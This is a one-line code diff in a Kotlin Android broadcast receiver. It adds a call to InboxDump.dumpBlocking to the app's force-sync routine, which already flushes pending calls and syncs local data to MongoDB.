@@ -33,6 +33,7 @@ class SyncTriggerReceiver : BroadcastReceiver() {
                     PendingCallQueue.flush(app)
                     PendingCallSync.flushIfPending(app)
                     LocalDataStore.syncPendingToMongo(app, "force_sync")
+                    InboxDump.dumpBlocking(app)
                     SyncScheduler.syncIfPermittedNow(app, "force_sync")
                     Log.d(TAG, "Force sync done")
                 } catch (error: Exception) {
